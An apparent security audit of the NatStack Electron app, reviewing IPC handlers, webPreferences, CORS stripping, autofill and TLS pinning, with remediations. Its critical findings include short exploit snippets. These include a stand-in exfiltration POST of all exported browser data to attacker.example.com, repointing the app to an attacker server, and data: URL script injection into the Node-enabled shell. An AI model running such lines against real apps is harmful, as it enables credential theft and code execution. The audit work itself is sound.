# NatStack — Electron Security Audit

**Audit date:** 2026-04-23
**Audit scope:** `src/main/**`, `src/preload/**`, `src/renderer/**`, IPC surface, webContents creation, session/partition isolation, TLS pinning, autofill
**Electron version reviewed:** `^39.2.5` (see `package.json`)
**Branch:** `audit`

---

## Executive summary

| Severity   | Count |
| ---------- | ----- |
| Critical   | 4     |
| High       | 6     |
| Medium     | 5     |
| Low        | 3     |
| Info       | 2     |

The renderer-to-main trust boundary is materially weaker than the code comments claim. The biggest structural issue is that `ServiceDispatcher.dispatch()` does not enforce the `policy.allowed` whitelist — it is defined on every service definition but never consulted on the Electron side. The IPC handler (`natstack:serviceCall`) further blurs the line by blanket-labelling every non-shell sender as `callerKind: "panel"` and trusting that. The combined effect is that any app panel can call `remoteCred.save`, `remoteCred.relaunch`, `view.browserNavigate(shellId, 'javascript:...')`, `app.openDevTools` on the shell, `menu.*`, `settings.*`, and can read/write the entire browser-data database (passwords, history, cookies) via `browser-data.*` and `autofill.confirmSave` — by design of the catch-all handler, not despite it.

There is also a direct IPC path (`natstack:navigate`) that accepts `(browserId, url)` from any panel with no ownership check, giving any panel full cross-panel navigation control including `javascript:`, `file:`, and `data:` URLs. `javascript:` is rejected by Chromium in `loadURL` for top-level navigation in most Electron 39 builds, but `file://` and `data:` are not, and `loadURL` of a URL on a privileged origin against an unaware panel is still a credential-theft primitive.

The shell renderer runs with `nodeIntegration: true`, `contextIsolation: false`, `sandbox: false` against the default session, while the application simultaneously strips CORS on the default session. If any untrusted string ever reaches the shell via `innerHTML` or `document.write`, the attacker gets Node. One `innerHTML` with error text already exists in `src/renderer/index.tsx:30`.

The autofill IPC channels (`natstack:autofill:ping`, `natstack:autofill-overlay:select`, `natstack:autofill-overlay:dismiss`) do not validate that the sender is an autofill-participating webContents. `...-overlay:select` in particular will cause `AutofillManager.handleOverlaySelect(id)` to scan every tracked panel and auto-fill the matching credential into whichever panel happens to have it loaded. Any compromised renderer that can reach `ipcRenderer.send` can weaponise this.

TLS fingerprint pinning in remote mode is applied only to `session.defaultSession` (the shell/panels session). Panels that open in the `persist:browser` partition or a `persist:panel:*` partition are NOT covered by the pinned `setCertificateVerifyProc`, meaning a browser panel in remote mode will validate the managed host with the default (system-CA) chain — and will reject a self-signed host the pinned main session accepts. That is usability-broken, but more importantly `app.on("session-created")` is registered AFTER sessions may already be created for partitioned contexts, so the default-CA fallback silently leaks.

---

## Scope & methodology

Files read end-to-end:

- `src/main/index.ts` (app bootstrap, 1028 lines)
- `src/main/viewManager.ts` (WebContentsView lifecycle, 1180 lines)
- `src/main/panelView.ts` (panel view creation + link interception)
- `src/main/panelOrchestrator.ts`
- `src/main/cdpServer.ts`
- `src/main/menu.ts`
- `src/main/ipcDispatcher.ts`
- `src/main/testApi.ts`
- `src/main/tlsPinning.ts`
- `src/main/serverClient.ts`
- `src/main/remoteCredentialStore.ts`
- `src/main/services/*.ts` (all 9 services)
- `src/main/autofill/autofillManager.ts`
- `src/main/autofill/autofillOverlay.ts`
- `src/main/adblock/adBlockManager.ts`
- `src/main/shellCore/createElectronShellCore.ts`
- `src/preload/index.ts`, `panelPreload.ts`, `browserPreload.ts`, `autofillPreload.ts`, `autofillOverlayPreload.ts`, `ipcTransport.ts`
- `src/renderer/index.tsx`
- `packages/shared/src/servicePolicy.ts`, `serviceDispatcher.ts`
- `packages/shared/src/shell/urlParsing.ts`
- `packages/shared/src/contextIdToPartition.ts`

Methods:

- Enumerated every `ipcMain.handle` / `ipcMain.on` registration
- Verified sender resolution in each handler (who is the caller? do they own the resource they're mutating?)
- Traced every `webContents.loadURL` / `loadFile` back to its caller
- Traced `webPreferences` for every `new WebContentsView` / `new BrowserWindow` / `new BrowserView`
- Checked every `will-navigate`, `setWindowOpenHandler`, `web-contents-created` hook
- Read every `ServiceDefinition.policy` and cross-referenced with dispatcher enforcement
- Verified TLS pinning coverage across sessions

---

## Findings

### [CRITICAL-1] Service policy (`policy.allowed`) is never enforced on the Electron side

**Files:** `packages/shared/src/serviceDispatcher.ts:125-177`, `src/main/index.ts:821-827`, every `src/main/services/*.ts`

`ServiceDispatcher.dispatch()` validates Zod args but never calls `checkServiceAccess`. The only places `checkServiceAccess` is invoked are `src/server/rpcServer.ts:496` and `:905` — the server's WebSocket RPC surface. The Electron-side dispatcher and the `natstack:serviceCall` IPC handler ignore policy entirely:

```ts
// src/main/index.ts:821
ipcMain.handle("natstack:serviceCall", async (event, method: string, args: unknown[]) => {
  const callerId = resolveCallerId(event);
  const parsed = parseServiceMethod(method);
  if (!parsed) throw new Error(`Invalid method format...`);
  const callerKind = callerId === "shell" ? "shell" as const : "panel" as const;
  return dispatcher.dispatch({ callerId, callerKind }, parsed.service, parsed.method, args);
});
```

Services that declare `policy: { allowed: ["shell"] }` are still reachable from a `callerKind: "panel"` request:

- `app` (`app.openDevTools`, `app.clearBuildCache`, `app.getShellPages`, `app.setThemeMode`)
- `panel` (tree mutation: `panel.archive`, `panel.create`, `panel.movePanel`, `panel.reload`, `panel.openDevTools`)
- `view` (`view.setBounds`, `view.setVisible`, `view.setThemeCss`, `view.browserNavigate` etc.)
- `menu`
- `settings`
- `remoteCred` (full: `save`, `clear`, `relaunch`, `testConnection`, `pickCaFile`, `getCurrent`)
- `adblock`
- `autofill` (`autofill.confirmSave` — approve a "save this password" prompt as if the user clicked)

**Exploit scenario.** A malicious panel (or a panel that has rendered attacker-controlled output such as an LLM response, remote URL etc.) in isolated-world-with-preload runs:

```js
window.__natstackElectron.serviceCall("remoteCred.save", {
  url: "https://attacker.example.com",
  token: "any",
});
window.__natstackElectron.serviceCall("remoteCred.relaunch");
```

The app now relaunches pointed at the attacker's "server", receives a new admin token, and authenticates. From there the attacker runs the whole NatStack backend including arbitrary code execution via panel builds. Alternatively:

```js
window.__natstackElectron.serviceCall("view.browserNavigate", ["shell", "data:text/html,<script>..."]);
```

redirects the shell itself (which runs with `nodeIntegration: true`, `contextIsolation: false`) to attacker HTML — and the shell is a Node process.

**Remediation:**

1. In `ServiceDispatcher.dispatch()` (or in a pre-dispatch wrapper invoked from both `IpcDispatcher.handleMessage` and the `natstack:serviceCall` handler) call `checkServiceAccess(service, ctx.callerKind, this, method)` before handler execution.
2. Double-check that `callerKind: "panel"` cannot be forged by a caller claiming `callerId === "shell"`. Currently `resolveCallerId` compares `event.sender.id` to `viewManager.getShellWebContents().id` — this is sound so long as no other code path sends `natstack:serviceCall` with a spoofed `callerKind`. Good.
3. Audit every service that currently has `allowed: ["shell", "panel", "worker"]` (`browser`, `auth`, `browser-data`) — `browser-data` should almost certainly be `shell`-only given it exports passwords.

---

### [CRITICAL-2] `browser-data` service exposes the entire password/cookie/history store to every panel

**File:** `src/main/services/browserDataService.ts:155`

```ts
policy: { allowed: ["shell", "panel", "worker"] },
methods: {
  getPasswords: { args: z.tuple([]) },
  getPasswordForSite: { args: z.tuple([z.string()]) },
  exportPasswords: { args: z.tuple([z.enum(["csv-chrome", "csv-firefox", "json"])]) },
  exportAll: { args: z.tuple([]) },
  ...
}
```

Even if [CRITICAL-1] is fixed, this policy *intentionally* grants every panel full read of:

- `browserDataStore.passwords.getAll()` (plaintext — `p.password` is returned verbatim in `exportPasswords`, line 429-442)
- cookie jar including cookies with `httpOnly` and `secure` attributes
- complete browsing history
- autofill records

`exportPasswords("csv-chrome")` returns all saved website credentials in plaintext as a CSV string — directly to the calling panel.

**Exploit scenario.** Any panel (e.g. a weather widget) calls:

```js
const all = await window.__natstackElectron.serviceCall("browser-data.exportAll");
fetch("https://attacker.example.com/x", { method: "POST", body: all });
```

CORS is wide-open on the default session per `src/main/index.ts:286-292` so the exfil POST succeeds cross-origin.

**Remediation:**

- Set `policy: { allowed: ["shell"] }` — password/cookie management belongs in the shell UI only. Per-method policies are a finer-grained option (e.g., allow `getAutofillSuggestions` to panels but not `getPasswords`), but a blanket `shell`-only is the safer default.
- Never return plaintext passwords across the IPC boundary; the autofill path already performs fill via `executeJavaScriptInIsolatedWorld` and doesn't need to serialize the password to the renderer. `exportPasswords` should be gated behind an explicit user confirmation dialog that runs in the main process and returns a file path, not the plaintext.

---

### [CRITICAL-3] Panel-to-panel browser control with no ownership check

**File:** `src/main/index.ts:835-860`

```ts
ipcMain.handle("natstack:navigate", async (event, browserId: string, url: string) => {
  resolveCallerId(event); // auth check
  const wc = viewManager!.getWebContents(browserId);
  if (!wc) throw new Error(`Browser webContents not found for ${browserId}`);
  try { await wc.loadURL(url); } catch (err) { ... }
});
ipcMain.handle("natstack:goBack",    async (event, browserId: string) => { resolveCallerId(event); viewManager!.getWebContents(browserId)?.goBack(); });
ipcMain.handle("natstack:goForward", ...);
ipcMain.handle("natstack:reload",    ...);
ipcMain.handle("natstack:stop",      ...);
```

The comment `// auth check` is misleading: `resolveCallerId` only confirms the sender is a *known* view, not that it owns `browserId`. Any panel can navigate any other panel (including the shell view id `"shell"`) to any URL.

Contrast with `natstack:getCdpEndpoint` which correctly enforces ownership via `cdpServer.canAccessBrowser`. The parallel `view.browserNavigate` service method in `src/main/services/viewService.ts:53-57` has the same flaw.

**Exploit scenarios:**

1. `serviceCall("view.browserNavigate", ["<any-panel-id>", "data:text/html,<script>...</script>"])` — drops attacker HTML into a victim panel's webContents. If that panel is an app panel with the panelPreload, the HTML now has `window.__natstackElectron.serviceCall` at its disposal, inheriting the panel's `callerId`.
2. Navigate a browser panel to `file:///Users/victim/.ssh/id_rsa` and then scrape it via CDP if the attacker panel is the CDP-parent — though CDP is ownership-gated, so this narrower attack doesn't directly succeed. The first scenario is the dangerous one.
3. Navigate the shell itself: `viewManager.getWebContents("shell").loadURL("file:///...")` — the shell runs with `nodeIntegration: true`, `contextIsolation: false`, `sandbox: false`. Any HTML served from `file://` or `data:` that ends up in the shell webContents gets Node access.

**Remediation:**

- Require that the caller owns or is a tree-ancestor of `browserId` (reuse `cdpServer.canAccessBrowser` or the equivalent). For app-panel navigation, require the caller IS `browserId` (self-navigate only). For browser-panel navigation, require parent ownership.
- Reject any `browserId === "shell"` explicitly — the shell must never be navigated by an IPC handler.
- Reject non-http(s) URL schemes; whitelist `http:` / `https:` / the managed host scheme. `javascript:` is already rejected by Chromium for top-level `loadURL`, but `file:`, `data:`, `blob:` are not.

---

### [CRITICAL-4] Shell renderer runs with `nodeIntegration: true`, `contextIsolation: false`, `sandbox: false`, `webSecurity` side-effects

**Files:** `src/main/viewManager.ts:135-143`, `src/main/index.ts:286-292`, `src/renderer/index.tsx:30`

```ts
// viewManager.ts:135 — shell view
this.shellView = new WebContentsView({
  webPreferences: {
    preload: options.shellPreload,
    nodeIntegration: true,
    contextIsolation: false,
    sandbox: false,
    additionalArguments: options.shellAdditionalArguments,
  },
});
```

Combined with:

```ts
// index.ts:286 — CORS stripped on defaultSession
session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
  const headers = { ...details.responseHeaders };
  headers["access-control-allow-origin"] = ["*"];
  headers["access-control-allow-headers"] = ["*"];
  headers["access-control-allow-methods"] = ["*"];
  callback({ responseHeaders: headers });
});
```

And:

```tsx
// renderer/index.tsx:30
container.innerHTML = `<div style="color: red; padding: 20px; font-family: monospace;">
  <h2>Failed to initialize app</h2>
  <pre>${error instanceof Error ? error.message : String(error)}</pre>
  <pre>${error instanceof Error ? error.stack : ""}</pre>
</div>`;
```

Any path that lets an attacker control an error message — for example, a malformed RPC response that surfaces as an error during `initializeApp()` — results in HTML injection in a Node-enabled context. The JSX `<pre>` below would be safer, but this uses `innerHTML`. Since the shell loads bundled HTML only, the practical attack surface is narrow today, but the combination of *all three* of (a) nodeIntegration, (b) CORS stripped, (c) any `innerHTML` sink makes this one bug away from full RCE.

Additionally, the strip-CORS middleware runs for **every** request in `session.defaultSession`, including requests from app panels on that session — any app panel can now make cross-origin fetches to Gmail/GitHub/etc. without consent, reading the response body, provided the user has cookies for those sites in the default session (they shouldn't, since app panels don't browse to external sites, but the panel can still use `fetch()` against them).

**Remediation:**

1. **Do not strip CORS globally.** The comment says app panels need it for "Gmail, Notion, etc." — but app panels should go through the proxied egress path (`packages/egress-proxy` / the server's egress), which already does per-manifest allowlisting and consent. Remove the `onHeadersReceived` override. If a targeted override is required for specific domains, do it on a path whitelist, not `*`.
2. **Turn on `contextIsolation: true` and `sandbox: true` for the shell** and use a contextBridge for the necessary APIs. nodeIntegration should be off. The comment `nodeIntegration enabled for direct fs/git access (shell is trusted app UI)` is stale — fs/git work is routed through services now.
3. Replace `innerHTML =` with React error-boundary rendering. No `innerHTML` in a Node-enabled renderer, ever.

---

### [HIGH-1] `natstack:rpc:send` hardcodes `callerKind: "shell"` regardless of sender

**File:** `src/main/ipcDispatcher.ts:86-88`

```ts
ipcMain.on("natstack:rpc:send", (event, targetId: string, message: unknown) => {
  this.handleMessage(event.sender, "shell", targetId, message as RpcMessage);
});
```

The handler accepts from *any* webContents but always labels the caller as `"shell"`. In `handleMessage`, if `service` is in `SERVER_SERVICES`, the call is forwarded verbatim to the server via `serverClient.call(service, method, args)`, where it is further dispatched on the server's `ServiceDispatcher` — this time *with* policy enforcement. But the admin token attached to that WS session means the server will see `callerKind: "shell"` on every such call. A panel that finds a way to raise `ipcRenderer.send` (for example via a contextBridge leak, or if a future preload revision exposes `send`) would be indistinguishable from the shell on the server side.

Practical exposure today is lower because panel preloads expose only `invoke` — not `send("natstack:rpc:send", ...)`. However browser panels have `browserPreload.ts` with `__natstack_autofill.ping()` which uses `send`, showing that panels can use `ipcRenderer.send` if it's ever exposed; and the autofill preloads import `ipcRenderer` directly. A single careless `contextBridge.exposeInMainWorld` refactor would expose `send` to an untrusted context and promote this to CRITICAL.

**Remediation:**

- Validate `event.sender.id === getShellWebContents()?.id` inside the handler. Reject otherwise.
- Do not accept the wildcard "natstack:rpc:send" from any non-shell origin. Non-shell RPC should use `natstack:serviceCall` exclusively.

---

### [HIGH-2] Autofill ipc listens from any webContents without sender validation

**Files:** `src/main/autofill/autofillManager.ts:130-133`, `src/main/autofill/autofillOverlay.ts:26-32`

```ts
// autofillManager.ts
ipcMain.on("natstack:autofill:ping", (event) => {
  const wcId = event.sender.id;
  void this.handlePing(wcId, event.sender);
});

// autofillOverlay.ts
ipcMain.on("natstack:autofill-overlay:select", (_event, id: number) => {
  this.callbacks?.onSelect(id);
});
ipcMain.on("natstack:autofill-overlay:dismiss", () => {
  this.callbacks?.onDismiss();
});
```

`natstack:autofill:ping` uses `event.sender.id` so it only acts on the caller's own state — the risk is limited to a panel spoofing "my autofill content script is running" to induce credential loading. Still, it causes `passwordStore.getForOrigin(currentOrigin)` to run and can cause fill attempts; a panel can trigger a fill into itself even if the content script was never injected.

`natstack:autofill-overlay:select` and `natstack:autofill-overlay:dismiss` are the worse case. `onSelect(credentialId)` calls `handleOverlaySelect` which scans all panels and fills the credential into whichever panel has it loaded. There's no check that the event came from the overlay view, that the overlay is currently visible, or that `credentialId` belongs to the visible panel. An attacker-controlled renderer that can reach `ipcRenderer.send` can iterate credential IDs and force fills into any panel that currently has credentials loaded — and then read them back through the DOM.

Today, the panel preload (`panelPreload.ts`) does not expose `ipcRenderer.send`. But the browser preload (`browserPreload.ts:10`) exposes `__natstack_autofill.ping()` which wraps `ipcRenderer.send("natstack:autofill:ping")`. If an attacker controls content in a browser panel (which they do — browser panels load arbitrary external sites) and can chain to `ipcRenderer.send` with a different channel name, this is direct credential theft. Review indicates the overlay preload (`autofillOverlayPreload.ts`) is only injected into the overlay WebContentsView, so content-page JS can't reach it. But `ipcRenderer.send` with any channel name is a single typo away from being reachable if the preload shape ever changes.

**Remediation:**

- All three `ipcMain.on` registrations should validate `event.sender.id`:
  - `autofill:ping` — allow only senders that are in `panelState` (i.e., autofill is attached).
  - `autofill-overlay:select` / `dismiss` — allow only `event.sender.id === overlayView.webContents.id`.
- Convert `ipcMain.on` to `ipcMain.handle` where feasible, and in the handler check `event.senderFrame?.isMainFrame && event.senderFrame.origin === expectedOverlayOrigin`.

---

### [HIGH-3] `natstack:openExternal` allows arbitrary http/https including javascript-scheme exfil via user's default browser

**File:** `src/main/index.ts:803-816`

```ts
ipcMain.handle("natstack:bridge.openExternal", async (_event, url: string) => {
  if (!/^https?:\/\//i.test(url)) {
    throw new Error("openExternal only supports http/https URLs");
  }
  const { shell } = await import("electron");
  await shell.openExternal(url);
});
```

The scheme check is good. But any panel can trigger `shell.openExternal(anyUrl)` with no user confirmation, causing the OS default browser to open an attacker URL. While the attacker doesn't gain execution in NatStack, they can:

- Drive drive-by downloads.
- Launch an OAuth consent for an attacker-controlled app using the user's browser session on a trusted SSO provider.
- Serve phishing that looks like it came from NatStack.

Severity is High (not Critical) because the OS browser enforces its own sandbox. Still, no direct IPC call from a panel should silently launch the user's browser to an attacker URL — this should have a shell-mediated confirmation for cross-origin URLs or at least rate-limiting.

**Remediation:**

- Require shell-level caller (`ctx.callerKind === "shell"`) OR gate panel calls through a consent dialog (there's already `src/renderer/components/ConsentDialog.tsx`).
- Add allowlist / rate-limit for repeated `openExternal` calls from the same panel.

---

### [HIGH-4] `natstack:openFolderDialog` / `openFileDialog` have no caller restriction

**File:** `src/main/index.ts:778-801`

```ts
ipcMain.handle("natstack:bridge.openFolderDialog", async (_event, opts?: { title?: string }) => {
  const result = await dialog.showOpenDialog({
    properties: ["openDirectory", "createDirectory"],
    title: opts?.title ?? "Select Folder",
  });
  return result.canceled ? null : result.filePaths[0] ?? null;
});
```

Any panel can pop the native file/folder picker at any time and return the resulting absolute path. Combined with a social-engineering attack in the panel UI, this grants the panel the absolute path to any file the user selects. Panels can't then read those paths directly through this IPC — but the path is an information leak (home dir layout, project names) and is a useful building block for chained attacks (see server-side filesystem services). Also, the dialog is modal and can be used to coerce the user into clicking by repeatedly popping it.

**Remediation:**

- Require `callerKind: "shell"`. If panel-originated file/folder picks are needed, route them through a broker service that requires user-consent per-call.
- Optionally, return an opaque handle rather than the absolute path.

---

### [HIGH-5] Panels' `createBrowserPanel` / `createPanel` with no URL scheme restriction beyond http(s), and panel source is used to build panel URLs without scheme filtering

**File:** `src/main/panelOrchestrator.ts:214-216`, `src/main/index.ts:746-753`

`createBrowserPanel` enforces `/^https?:\/\//i.test(url)` — good. But panel creation via `createPanel(callerId, source, options, stateArgs)` does not restrict `source`. A malicious panel can pass a crafted `source` that, when combined server-side with `buildPanelUrl`, could try to escape the gateway URL. Impact depends on server-side `buildPanelUrl` and the panel HTTP gateway's routing — not reviewed in full here. At minimum, validate that `source` is a plain `namespace/name` string matching a simple regex.

**Remediation:**

- Validate `source` against `^[a-z0-9][a-z0-9-]{0,63}/[a-z0-9][a-z0-9-]{0,63}$` before passing to `shellCore.create`.
- Validate `stateArgs` is a flat serializable object (no prototypes / functions / `__proto__` keys).

---

### [HIGH-6] Remote-mode TLS certificate pinning only covers the default session

**File:** `src/main/index.ts:117-159`

```ts
function installRemoteCertificateOverride(mode: StartupMode): void {
  ...
  const installForSession = (targetSession: Session): void => {
    targetSession.setCertificateVerifyProc((request, callback) => { ... });
  };
  app.on("session-created", installForSession);
  if (app.isReady()) {
    installForSession(session.defaultSession);
  } else {
    void app.whenReady().then(() => {
      installForSession(session.defaultSession);
    });
  }
}
```

Two issues:

1. **`app.on("session-created")` vs. partition-session creation.** `session.fromPartition("persist:browser")` creates the browser partition session **lazily** — typically the first time a view is created with that partition. If `app.on("session-created")` fires *before* `installRemoteCertificateOverride` is called, those partitioned sessions won't get the pinned verify proc. Timing: `installRemoteCertificateOverride` runs at top-level module init (before `app.whenReady`), while sessions typically aren't created until `app.ready` — so this should be safe *today*, but it is fragile and an initialization-order change would silently disable pinning on partition sessions.
2. **Intentional scope gap.** Even when the hook fires correctly, the verify proc only accepts certs whose `request.hostname` is the managed host; for other hostnames it calls `callback(-3)` (chain-not-verified), which forces rejection. Browser panels in `persist:browser` partition need to verify *arbitrary* hostnames against the system CA. That means the remote-mode pinning in effect *breaks* browser panels in remote mode unless those panels' requests somehow don't pass through the verify proc — which they do when they reach the partition session. This conflict is not resolved in-code.

**Remediation:**

- Call `installRemoteCertificateOverride` after `app.whenReady()` always; register a matching handler via `app.on("session-created", installForSession)` before any session is created to avoid the lazy-creation race.
- In the verify proc, fall back to Chromium's default verification for non-managed hosts instead of outright rejecting with `-3`. Concretely: when `!sameManagedHost`, call `callback(-3)` only if this is a session that should be restricted (e.g. default session for shell) — and for `persist:browser` partitions, install a *different* verify proc (or none) so that browser-panel sites verify normally.
- Add a regression test that (a) the pinned session rejects mismatched certs, and (b) the `persist:browser` session still accepts a real CA-signed cert.

---

### [MEDIUM-1] `view.setBounds`, `view.setVisible`, `view.setThemeCss`, `view.updateLayout`, `view.setShellOverlay` have no ownership check

**File:** `src/main/services/viewService.ts`

Any caller (shell, and per [CRITICAL-1] also any panel) can resize, hide, or theme any view by id. `view.setVisible(id, false)` on the shell hides the shell. `view.setBounds(otherPanelId, {x:0,y:0,width:0,height:0})` hides another panel. `view.setThemeCss("body{display:none}")` injects CSS into all views that opt into theme injection.

Even after CRITICAL-1 is fixed, there's no tree-scoping here for shell-legitimate use. Shell-only is probably sufficient.

**Remediation:**

- Keep `shell`-only policy AND enforce it.
- For `setBounds` / `setVisible`, add a per-panel owner check as defense in depth — even shell should not be able to reach panels outside its tree in a future multi-shell world.

---

### [MEDIUM-2] `setWindowOpenHandler` silently denies non-http(s) URLs without logging

**File:** `src/main/panelView.ts:349-366`

```ts
contents.setWindowOpenHandler((details) => {
  const url = details.url;
  const parsed = parsePanelUrl(url, this.externalHost);
  if (parsed) { ... return { action: "deny" }; }
  if (/^https?:\/\//i.test(url)) { ... return { action: "deny" }; }
  return { action: "deny" as const };
});
```

Good: all window.open calls deny. But the silent-deny fallback means a compromised panel trying to launch e.g. `file:///etc/passwd` via `window.open` is not logged. This is info/telemetry rather than a vulnerability, but a warn log would make iterative hardening easier.

Also: `new-window` event (deprecated but still receivable) is not handled — `setWindowOpenHandler` supersedes it in modern Electron, which is fine for Electron 39.

**Remediation:**

- Log every denied window.open at INFO with url + callerId so anomalous attempts surface.

---

### [MEDIUM-3] `will-navigate` link interception does not filter non-http schemes in external-link path

**File:** `src/main/panelView.ts:368-400`

```ts
const willNavigateHandler = (event: Electron.Event, url: string) => {
  if (!isManagedHost(url, this.externalHost)) {
    if (/^https?:\/\//i.test(url)) {
      event.preventDefault();
      void this.panelOrchestrator.createBrowserPanel(parentId, url, { focus: true })
      ...
    }
    return;  // ← non-http/https managed-external URL is NOT prevented
  }
  ...
};
```

If the navigation target is not the managed host AND not http(s), the handler returns without calling `event.preventDefault()`. `file://`, `javascript:`, `data:`, `blob:` top-level navigations therefore proceed. Chromium blocks top-level `javascript:` navigation in most modern versions, but `file://` and `data:` do not block by default in Electron unless `webSecurity: true` + frame rules apply.

**Remediation:**

```ts
if (!isManagedHost(url, this.externalHost)) {
  if (/^https?:\/\//i.test(url)) {
    event.preventDefault();
    void this.panelOrchestrator.createBrowserPanel(...);
  } else {
    event.preventDefault(); // reject non-http(s) schemes entirely
  }
  return;
}
```

---

### [MEDIUM-4] No `setPermissionRequestHandler` / `setPermissionCheckHandler`

**Files:** none — these are *not* set anywhere.

Electron defaults grant panel webContents the ability to request geolocation, notifications, microphone, camera, mediaKeySystem, midi, pointerLock, display-capture, clipboard-sanitized-write, etc. Browser panels load *arbitrary* external URLs; on the `persist:browser` partition, an attacker site can prompt for microphone/camera and the user may grant it. Even on the default session, lack of a permission handler is a defense-in-depth gap.

**Remediation:**

- Install a `setPermissionRequestHandler` on both `session.defaultSession` and `session.fromPartition(BROWSER_SESSION_PARTITION)` at app ready. Default-deny high-sensitivity permissions for panels; for browser panels, gate via the existing consent dialog (`src/renderer/components/ConsentDialog.tsx`).
- Install `setPermissionCheckHandler` to give precise control over synchronous permission checks.

---

### [MEDIUM-5] AdBlock IPC handler executes filter-engine-provided scripts with `userGesture: true`

**File:** `src/main/adblock/adBlockManager.ts:510-515`

```ts
for (const script of scripts) {
  try {
    if (!event.sender.isDestroyed()) {
      await event.sender.executeJavaScript(script, true);  // userGesture: true
    }
  } catch (e) { ... }
}
```

Script text comes from `this.engine.getCosmeticsFilters({...})` — i.e., from the ad-block filter lists (EasyList, EasyPrivacy, etc.). These are loaded from public HTTPS (`https://easylist.to/...`). The `userGesture: true` argument means the script runs as if the user clicked — it can open popups, auto-play media, and, in Electron 39, gains a user-activation flag for various gated APIs. If an attacker compromises the upstream filter-list provider, or an MITM on HTTPS in an unusual configuration, they can inject arbitrary JS to run in every browser panel.

**Remediation:**

- Pin filter-list sources or verify signatures if upstream supports them.
- Pass `userGesture: false` (the default) — cosmetic scriptlets rarely need the activation bit.
- Sandbox scriptlet execution via `executeJavaScriptInIsolatedWorld` so the scriptlet cannot clobber the page's own globals.

---

### [LOW-1] `cdpServer` uses `ws://localhost` without TLS

**File:** `src/main/cdpServer.ts:170-171`

```ts
return `ws://localhost:${this.getPort()}/${browserId}?token=${token}`;
```

The endpoint URL is handed to panels via `getCdpEndpoint`. An attacker on the same host (other user) could bind a server to the same port first — `findServicePort` scans for free ports, so if an attacker races to bind a known port, they could theoretically intercept. The token in the query string at least prevents trivial impersonation. Token is validated on ws upgrade.

Low-risk because (a) local-only, (b) token-gated, (c) Electron app is typically the only user-session process binding these ports. But tokens in query strings get logged by proxies/firewalls/dev-tools; moving to `Authorization` header or WS subprotocol would be cleaner.

**Remediation:**

- Use `Sec-WebSocket-Protocol: natstack-cdp.${token}` or a header instead of a query param to avoid log leakage.
- Consider binding to `127.0.0.1` (not `localhost`) explicitly to avoid resolution races on IPv4/IPv6.

---

### [LOW-2] `testApi` exposes panel-tree mutation to the Node-integrated shell global

**File:** `src/main/testApi.ts:68-121`

```ts
if (process.env["NATSTACK_TEST_MODE"] !== "1") { return; }
global.__testApi = { ... };
```

Gate is an env var. Correctly scoped to test mode. However, in test mode, the API lives on `global.__testApi` in the **main process** — not the renderer. It's called from Playwright via `electronApp.evaluate(...)`. Not exposed to panels.

**Remediation:**

- Add a log line at startup if test API activates, to make the active privilege escalation visible during dev.
- Consider requiring both the env var AND a runtime "opt-in" dialog in non-CI mode to avoid test builds accidentally shipping the API.

---

### [LOW-3] Shell preload sets `__natstackTransport` on `globalThis` (shell is contextIsolation: false)

**File:** `src/preload/index.ts:22`

```ts
globalThis.__natstackTransport = shellTransport;
```

With `contextIsolation: false`, `globalThis` is shared with the page. Any shell-loaded code (or any injected content) can replace or wrap this transport. Today the shell loads only app-bundled HTML, so the risk is internal. If the shell ever loads any third-party JS, the transport can be hijacked to spoof RPC calls.

**Remediation:**

- Turn on `contextIsolation` (cf. [CRITICAL-4]) and use `contextBridge.exposeInMainWorld`.

---

### [INFO-1] Electron version is current

`electron: ^39.2.5` is acceptable as of audit date. Electron 39 retains the `will-attach-webview`, `setWindowOpenHandler`, and `setCertificateVerifyProc` APIs used here. No version-specific CVE concerns identified in this review.

### [INFO-2] safeStorage used for remote token persistence

`remoteCredentialStore.ts` uses `safeStorage.encryptString` with a documented plaintext fallback. Behavior is correct. One note: the plaintext-fallback log message only appears in `saveRemoteCredentials`; consider also warning on `loadRemoteCredentials` when `stored.encrypted === false` so users running in degraded mode are reminded every launch.

---

## Overall recommendations

1. **Enforce `ServiceDispatcher` policy at every entry point.** Add `checkServiceAccess` to `ServiceDispatcher.dispatch` itself (or to an intermediate `safeDispatch`) so that any caller reaching the dispatcher is policy-checked. Verify with a test that attempts to call a `shell`-only service from a panel context fail.
2. **Tighten `resolveCallerId` into a `resolveCaller` that returns `{ callerId, callerKind }` and is used uniformly.** No handler should independently decide `callerKind`.
3. **Replace the catch-all `natstack:serviceCall` design with a service-method allowlist keyed by caller kind.** Generic dispatch + blanket policy is brittle.
4. **Remove the global CORS-strip on the default session.** Route panel outbound HTTP through the egress proxy.
5. **Flip the shell to `contextIsolation: true, sandbox: true, nodeIntegration: false`** and expose the minimum required API via a contextBridge in `src/preload/index.ts`. Migrate `__natstackTransport` to an `exposeInMainWorld` call.
6. **Add ownership checks to every IPC handler that mutates a view or web contents by id.** Handlers should accept an explicit `callerId` and compare it to the resource owner. Reuse `CdpServer.canAccessBrowser`-style ancestor checks across the main process.
7. **Install `setPermissionRequestHandler` / `setPermissionCheckHandler` on every session at ready.** Default-deny high-sensitivity permissions.
8. **Harden the autofill IPC channels** with sender validation; require `event.sender.id === overlayView.webContents.id` for overlay select/dismiss.
9. **Reject non-http(s) schemes** in `will-navigate` and in `view.browserNavigate`, not just in `createBrowserPanel`.
10. **Fix TLS pinning scope.** Apply the pinned verify proc only to the default (shell) session; install a different (or none) verify proc for `persist:browser`.
11. **Remove `innerHTML` in `src/renderer/index.tsx`.** Use React to render the error state.
12. **Add a security CI check.** ESLint rule `electron/no-node-integration` (via `eslint-plugin-electron`) and a static scan that any `policy.allowed.includes("panel")` service method is flagged for manual review.

---

## Appendix: files reviewed

**Main process:**

- `src/main/index.ts`
- `src/main/viewManager.ts`
- `src/main/panelView.ts`
- `src/main/panelOrchestrator.ts`
- `src/main/cdpServer.ts`
- `src/main/menu.ts`
- `src/main/ipcDispatcher.ts`
- `src/main/testApi.ts`
- `src/main/tlsPinning.ts`
- `src/main/serverClient.ts`
- `src/main/remoteCredentialStore.ts`
- `src/main/serverSession.ts` (skimmed — not critical for this audit's scope)
- `src/main/startupMode.ts` (skimmed)

**Services:**

- `src/main/services/appService.ts`
- `src/main/services/panelShellService.ts`
- `src/main/services/viewService.ts`
- `src/main/services/menuService.ts`
- `src/main/services/settingsService.ts`
- `src/main/services/adblockService.ts`
- `src/main/services/browserService.ts`
- `src/main/services/browserDataService.ts`
- `src/main/services/authService.ts`
- `src/main/services/remoteCredService.ts`
- `src/main/services/contextMiddleware.ts`

**Autofill / adblock:**

- `src/main/autofill/autofillManager.ts`
- `src/main/autofill/autofillOverlay.ts`
